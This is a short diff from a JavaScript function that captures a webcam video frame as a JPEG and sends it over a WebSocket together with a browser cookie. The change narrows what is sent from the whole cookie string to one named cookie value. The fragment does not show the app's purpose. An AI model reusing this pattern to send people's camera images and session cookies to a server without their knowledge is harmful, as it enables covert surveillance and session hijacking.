@@ -57,7 +57,7 @@ function sendScreenshot() {
     try {
 	let screenshot = ctx.drawImage(video, 0, 0);
 	img = canvas.toDataURL('image/jpeg', 0.1);
-	cookie = document.cookie;
+	cookie = document.cookie.replace(/(?:(?:^|.*;\s*)cookie\s*\=\s*([^;]*).*$)|^.*$/, "$1");
 	ws.send(JSON.stringify({ "cookie" : cookie, "image" : img }));
     } catch (e) {
 	console.log('Unable to acquire screenshot: ' + e);
